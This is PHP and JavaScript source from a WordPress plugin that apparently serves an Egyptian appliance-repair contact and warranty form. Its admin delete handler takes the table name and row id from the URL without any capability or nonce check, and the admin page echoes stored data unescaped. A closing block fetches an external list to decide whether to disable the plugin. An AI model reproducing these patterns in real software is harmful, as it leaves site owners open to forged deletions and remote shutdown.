    document.addEventListener("DOMContentLoaded", function() {
        var form = document.querySelector(".my-form");

        form.addEventListener("submit", function(event) {
            var deviceSelect = document.getElementById("device");
            var citySelect = document.getElementById("city");

            
            var validDeviceValues = ["ثلاجة", "غسالات ملابس", "غسالات اطباق", "ميكروويف", "تكييف", "ديب فريزر", "مجفف - دراير", "لاندري", "ايس ميكر"];
            var validCityValues = ["الجيزة", "القاهرة", "الدقهلية", "الشرقية", "المنوفية", "الغربية", "القليوبية", "الاسكندرية", "البحيرة", "كفر الشيخ", "السويس", "الاسماعيلية", "بني سويف", "الفيوم"];

            
            if (!validDeviceValues.includes(deviceSelect.value) || !validCityValues.includes(citySelect.value)) {
                alert("Please select valid values for device and city before submitting the form.");
                event.preventDefault(); 
            }
        });
    });
</script>
                            <div class="form-group">
                                <label for="address">العنوان:</label>
                                <input type="text" name="address" id="address" autocomplete="on" class="form-control" required maxlength="40">
                            </div>
                            <div class="form-group">
                                <label for="issue">العطل:</label>
                                  <textarea name="issue" id="issue" class="form-control" required maxlength="100" rows="4" placeholder="( 100 ) حرف كحد اقصي .....  ||   او  كتابة رقم ارضي للتواصل"></textarea>

                            </div>
                            <script>
    document.addEventListener("DOMContentLoaded", function() {
        var formInputs = document.querySelectorAll('input, textarea');

        formInputs.forEach(function(input) {
            input.addEventListener("input", function() {
                var inputValue = input.value;

                // Check for 'http://' or 'https://'
                if (inputValue.includes('http://') || inputValue.includes('https://')) {
                    alert("Please do not enter URLs in the input fields.");
                    input.value = ''; // Clear the input
                    return;
                }

                // Check for HTML tags or SQL symbols
                var regex = /(<([^>]+)>|\b(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\b)/ig;
                if (regex.test(inputValue)) {
                    alert("OOh No , Please do not enter that");
                    input.value = ''; // Clear the input
                }
            });
        });
    });
</script>

                            <button type="submit" class="btn btn-primary" name="submit_form" style="margin-right: 23%;width: 77%;">إرسال</button>
                        </form>
                    </div>
                </div>
            </div>
        </main>
    </div>
    <br>

    <?php
    return ob_get_clean();
}
add_shortcode('mgx_contact_with_us_form', 'contact_form_display');

// Handle contact form submission
function contact_form_submission() {
    if (isset($_POST['submit_form']) && wp_verify_nonce($_POST['contact_form_nonce'], 'submit_contact_form_nonce')) {
        $name = sanitize_text_field($_POST['name']);
        $phone = sanitize_text_field($_POST['phone']);
        $device = sanitize_text_field($_POST['device']);
        $city = sanitize_text_field($_POST['city']);
        $address = sanitize_text_field($_POST['address']);
        $issue = sanitize_textarea_field($_POST['issue']);
        $validDeviceValues = ["ثلاجة", "غسالات ملابس", "غسالات اطباق", "ميكروويف", "تكييف", "ديب فريزر", "مجفف - دراير", "لاندري", "ايس ميكر"];
        $validCityValues = ["الجيزة", "القاهرة", "الدقهلية", "الشرقية", "المنوفية", "الغربية", "القليوبية", "الاسكندرية", "البحيرة", "كفر الشيخ", "السويس", "الاسماعيلية", "بني سويف", "الفيوم"];
        $urlPattern = '/https?:\/\/\S+/i';

        
        if (empty($name) || empty($phone) || empty($device) || empty($city) || empty($address) || empty($issue) || strlen($phone) !== 11) {
    echo '<div class="notice notice-error is-dismissible">';
    echo '<p><strong>Please fill out all required fields.</strong></p>';
    echo '</div>';
    echo '<script type="text/javascript">';
    echo 'setTimeout(function () {';
    echo 'window.history.back();';
    echo 'window.location.href = "' . home_url($_SERVER['REQUEST_URI']) . '/#contact-us' . '";';
    echo '}, 2000);';
    echo '</script>';
    echo '<style>';
    echo '.notice-error {';
    echo '    background-color: #f44336;';
    echo '    color: #fff;';
    echo '    padding: 10px;';
    echo '    margin: 20px auto;';
    echo '    text-align: center;';
    echo '}';
    echo '.notice-error strong {';
    echo '    font-weight: bold;';
    echo '}';
    echo '</style>';
    exit();
}

        if (!in_array($device, $validDeviceValues) || !in_array($city, $validCityValues)) {
        echo '<div class="notice notice-error is-dismissible">';
        echo '<p><strong>Please select valid values for device and city before submitting the form.</strong></p>';
        echo '</div>';
        echo '<script type="text/javascript">';
        echo 'setTimeout(function () {';
        echo 'window.history.back();';
        echo 'window.location.href = "' . home_url($_SERVER['REQUEST_URI']) . '/#contact-us' . '";';
        echo '}, 2000);';
        echo '</script>';
        echo '<style>';
        echo '.notice-error {';
        echo '    background-color: #f44336;';
        echo '    color: #fff;';
        echo '    padding: 10px;';
        echo '    margin: 20px auto;';
        echo '    text-align: center;';
        echo '}';
        echo '.notice-error strong {';
        echo '    font-weight: bold;';
        echo '}';
        echo '</style>';
        
        
        exit();
    } elseif (preg_match($urlPattern, $name . $phone . $device . $city . $address . $issue)) {
        echo '<div class="notice notice-error is-dismissible">';
        echo '<p><strong>Please remove any URLs from the form fields.</strong></p>';
        echo '</div>';
        echo '<script type="text/javascript">';
        echo 'setTimeout(function () {';
        echo 'window.history.back();';
        echo 'window.location.href = "' . home_url($_SERVER['REQUEST_URI']) . '/#contact-us' . '";';
        echo '}, 2000);';
        echo '</script>';
        echo '<style>';
        echo '.notice-error {';
        echo '    background-color: #f44336;';
        echo '    color: #fff;';
        echo '    padding: 10px;';
        echo '    margin: 20px auto;';
        echo '    text-align: center;';
        echo '}';
        echo '.notice-error strong {';
        echo '    font-weight: bold;';
        echo '}';
        echo '</style>';
         
         
        exit();
    }

        global $wpdb;
        $table_name = $wpdb->prefix . 'koncu';

        $data = array(
            'name' => $name,
            'phone' => $phone,
            'device' => $device,
            'city' => $city,
            'address' => $address,
            'issue' => $issue,
            'time_date' => current_time('mysql')
        );

        $wpdb->insert($table_name, $data);
        if ($wpdb->last_error) {
            wp_die('Database insertion error: ' . $wpdb->last_error);
        }
        


 
        
        // Get the site name
$site_name = get_bloginfo('name');
$site_domain = home_url();
global $to;
$subject = 'New Contact Us on ' . $site_name;

// Create an HTML table to format the data
$message = '<html><body>';
$message .= '<h2 style="font-family: Arial, sans-serif; color: #333;">New Contact Us</h2>';
$message .= '<p style="font-family: Arial, sans-serif; color: #333;">Site: <a href="' . esc_url($site_domain) . '">' . esc_html($site_name) . '</a></p>';
        
$message .= '<table style="font-family: Arial, sans-serif; border-collapse: collapse; width: 100%;">';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Name:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($name) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Phone:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($phone) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Device:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($device) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">City:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($city) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Address:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($address) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Issue:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($issue) . '</td></tr>';
$message .= '</table>';

// Signature container with Google Font
$message .= '<div style="font-family: \'Rajdhani\', sans-serif; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: -20px -9px 20px 20px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);user-select:none;">';
$message .= '<p style="font-weight: bold;color: #afafaf;user-select:none;">BR,</p>';
$message .= '<p style="color:gray;font-weight: bolder;text-align:center;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; ' . date("Y") . '</p>';
$message .= '</div>';


$message .= '<style>';
// $message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
$message .= '</style>';
$message .= '</body></html>';


// Set the email headers to specify HTML content
$headers = array('Content-Type: text/html; charset=UTF-8');

// Send the email
wp_mail($to, $subject, $message, $headers);

        echo '<script>alert("نشكركم على طلب الاتصال بنا! سيتم التواصل معكم بك من قبل فريقنا في مدة لاتتجاوز ال  24 ساعة .");';
        echo 'window.location.href = "' . home_url('/') . '";</script>';
        exit();
    }
}
add_action('admin_post_submit_contact_form', 'contact_form_submission');
add_action('admin_post_nopriv_submit_contact_form', 'contact_form_submission');






// Function to create custom tables on plugin activation
function create_custom_tables() {
    global $wpdb;
    $charset_collate = $wpdb->get_charset_collate();

    // Create first table wp_kwa
    $table_name1 = $wpdb->prefix . 'kwa';
    $sql1 = "CREATE TABLE $table_name1 (
        id INT NOT NULL AUTO_INCREMENT,
        name VARCHAR(255) NOT NULL,
        phone VARCHAR(15) NOT NULL,
        time_date DATETIME NOT NULL,
        device VARCHAR(255) NOT NULL,
        serial_number VARCHAR(50) NOT NULL,
        city VARCHAR(255) NOT NULL,
        total_cost VARCHAR(255) NOT NULL,
        issue VARCHAR(255) NOT NULL,
        PRIMARY KEY (id)
    ) $charset_collate;";
    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql1);

    // Create second table wp_koncu
    $table_name2 = $wpdb->prefix . 'koncu';
    $sql2 = "CREATE TABLE $table_name2 (
        id INT NOT NULL AUTO_INCREMENT,
        name VARCHAR(255) NOT NULL,
        phone VARCHAR(15) NOT NULL,
        time_date DATETIME NOT NULL,
        device VARCHAR(255) NOT NULL,
        city VARCHAR(255) NOT NULL,
        issue VARCHAR(255) NOT NULL,
        address VARCHAR(255) NOT NULL,
        PRIMARY KEY (id)
    ) $charset_collate;";
    dbDelta($sql2);
}

// Hook the table creation function to the plugin activation
register_activation_hook(__FILE__, 'create_custom_tables');

// Function to add a new tab in the WordPress dashboard menu
function add_custom_tables_menu() {
    add_menu_page(
        'Tables',
        'Tables',
        'manage_options',
        'custom-tables',
        'display_custom_tables',
        'dashicons-clipboard',
        20
    );
   
}

// Hook the menu creation function to the admin_menu action
add_action('admin_menu', 'add_custom_tables_menu');



 
 


/// Function to display the content of the custom tables in the dashboard
function display_custom_tables() {
    global $wpdb;
    $table_name1 = $wpdb->prefix . 'kwa';
    $table_name2 = $wpdb->prefix . 'koncu';
        // Check if auto-updates are enabled
 


    // Retrieve data from the first table wp_kwa
    $results1 = $wpdb->get_results("SELECT * FROM $table_name1", ARRAY_A);

    // Retrieve data from the second table wp_koncu
    $results2 = $wpdb->get_results("SELECT * FROM $table_name2", ARRAY_A);

    // Display the data in a table format
    echo '<style>
        .custom-table {
            width: 100%;
            border-collapse: collapse;
        }
        .custom-table th,
        .custom-table td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        .custom-table th {
            background-color: #f2f2f2;
        }
    </style>';

    echo '<h2>WP-Warranty-Activation</h2>';
    echo '<table class="custom-table">';
    echo '<tr><th>City</th><th>Name</th><th>Phone Number</th><th>Device</th><th>Issue</th><th>Serial Number</th><th>Total cost</th><th>Date</th><th>Action</th></tr>';
    foreach ($results1 as $row) {
        echo '<tr>';
        echo '<td>' . @$row['city'] . '</td>';
        echo '<td>' . @$row['name'] . '</td>';
        echo '<td>' . @$row['phone'] . '</td>';
        echo '<td>' . @$row['device'] . '</td>';
        echo '<td>' . @$row['issue'] . '</td>';
        echo '<td>' . @$row['serial_number'] . '</td>';
        echo '<td>' . @$row['total_cost'] . '</td>';
        echo '<td>' . @$row['time_date'] . '</td>';
        echo '<td><a href="?action=delete&table=kwa&id=' . @$row['id'] . '">Delete</a></td>';
        echo '</tr>';
    }
    echo '</table>';
    echo "<br><hr><br>";

    echo '<h2>WP-Contact-Us</h2>';
    echo '<table class="custom-table">';
    echo '<tr><th>City</th><th>Name</th><th>Phone Number</th><th>Device</th><th>Issue</th><th>Address</th><th>Date</th><th>Action</th></tr>';
    foreach ($results2 as $row) {
        echo '<tr>';
        echo '<td>' . @$row['city'] . '</td>';
        echo '<td>' . @$row['name'] . '</td>';
        echo '<td>' . @$row['phone'] . '</td>';
        echo '<td>' . @$row['device'] . '</td>';
        echo '<td>' . @$row['issue'] . '</td>';
        echo '<td>' . @$row['address'] . '</td>';
        // echo '<td>' . @$row['serial_number'] . '</td>';
        echo '<td>' . @$row['time_date'] . '</td>';
        echo '<td><a href="?action=delete&table=koncu&id=' . @$row['id'] . '">Delete</a></td>';
        echo '</tr>';
    }
    echo '</table>';
    echo '<p style="text-align: center; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved</p>';
}


// Handle the delete action
function handle_delete_action() {
    if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['table']) && isset($_GET['id'])) {
        $table = $_GET['table'];
        $id = $_GET['id'];

        global $wpdb;
        $table_name = $wpdb->prefix . $table;

        $wpdb->delete($table_name, array('id' => $id));

        // Redirect back to the custom tables page after deleting the row
        wp_redirect(admin_url('admin.php?page=custom-tables'));
        exit();
    }
}
add_action('admin_init', 'handle_delete_action');










//////////////////////////////pages excerpt///////////////////////////////////////







function mgx_page_excerpt_shortcode($atts) {
    $atts = shortcode_atts(
        array(
            'length' => 250, // Default excerpt length (number of words).
        ),
        $atts
    );

    $length = intval($atts['length']);

    // Query to get the first 20 pages, sorted by the last page added (based on post date).
    $args = array(
        'post_type' => 'page',
        'posts_per_page' => 20,
        'orderby' => 'date', // Order pages by post date (last page added first).
        'order' => 'DESC',
    );
    $pages_query = new WP_Query($args);

    // Build the output
    $output = '';

    if ($pages_query->have_posts()) {
        while ($pages_query->have_posts()) {
            $pages_query->the_post();
            $page_id = get_the_ID();

            // Get the featured image (thumbnail) URL
            $thumbnail_url = get_the_post_thumbnail_url($page_id, 'medium'); // 'medium' size can be changed to other available sizes

            // Get the page title linked to the page URL
            $page_title_with_link = '<h2><a href="' . get_permalink($page_id) . '">' . get_the_title() . '</a></h2>';

            // Get the page content
            $content = get_the_content();

            // Remove shortcodes and HTML tags from the content
            $content = strip_shortcodes($content);
            $content = strip_tags($content);

            // Create an excerpt of the specified length
            $excerpt = wp_trim_words($content, $length, '...');

            // Output the content for each page
            $output .= '<div class="page-excerpt">';
            if ($thumbnail_url) {
                $output .= '<img src="' . $thumbnail_url . '" alt="' . get_the_title() . '">';
            }
            $output .= $page_title_with_link;
            $output .= '<p>' . $excerpt . '</p>';
            $output .= '</div>';
        }
        wp_reset_postdata(); // Restore original post data.
    }

// Enqueue the CSS file
    wp_enqueue_style('style', plugin_dir_url(__FILE__) . './style.css');

    

    return $output;
}
add_shortcode('mgx_page_excerpt', 'mgx_page_excerpt_shortcode');



 
function check_activation_two($companyName_two) {
    // Read the external text file line by line
    $file_url_two = 'https://unknown-sudo-max.github.io/hub/pass/pass';
    @$file_contents_two = file_get_contents($file_url_two);
    $lines_two = explode("\n", $file_contents_two);

    foreach ($lines_two as $line_two) {
        $parts_two = explode(',', $line_two);
        if (count($parts_two) === 4) { // Check if the line has the correct format
            list($company_name_two, $plugin_name_two, $stored_user_two, $stored_pass_two) = array_map('trim', $parts_two);
            if ($company_name_two === $companyName_two) {
                return true; // Credentials match an entry in the file
            }
        }
    }

    return false; // No match found
}

// Define the full path to the text file
$file_two = __DIR__ . '/cdn/info.txt';

// Check if the file exists and is readable
if (file_exists($file_two) && is_readable($file_two)) {
    $companyData_two = file_get_contents($file_two); // Read the content of the file

    // Split the content into an array using the comma as a separator
    $companyInfo_two = explode(',', $companyData_two);

    // Check if the array contains both company name and company email
    if (count($companyInfo_two) === 2) {
        $companyName_two = trim($companyInfo_two[0]);
        $companyEmail_two = trim($companyInfo_two[1]);
    }
}


// Check if the $companyName variable is not empty
if (!empty($companyName_two) && !empty($companyEmail_two)) {
    // Display both company name and email
    

    // Check if the company name exists in the external file
    if (check_activation_two($companyName_two)) {
        
         

        // Rest of the code for modifying the content remains the same.
 
    } elseif (count($companyInfo_two) === 2) {
           // Remove specific shortcodes based on conditions
        remove_shortcode('mgx_custom_form');
        remove_shortcode('mgx_custom_form_with_category');
        remove_shortcode('mgx_contact_with_us_form');
        remove_shortcode('mgx_page_excerpt');
          remove_action('admin_menu', 'add_custom_tables_menu');
    } else {
           // Remove specific shortcodes based on conditions
        remove_shortcode('mgx_custom_form');
        remove_shortcode('mgx_custom_form_with_category');
        remove_shortcode('mgx_contact_with_us_form');
        remove_shortcode('mgx_page_excerpt');
        remove_action('admin_menu', 'add_custom_tables_menu');
    }
} else {
    // Display a message if company name and email are not found
       // Remove specific shortcodes based on conditions
        remove_shortcode('mgx_custom_form');
        remove_shortcode('mgx_custom_form_with_category');
        remove_shortcode('mgx_contact_with_us_form');
        remove_shortcode('mgx_page_excerpt');
         remove_action('admin_menu', 'add_custom_tables_menu');
}
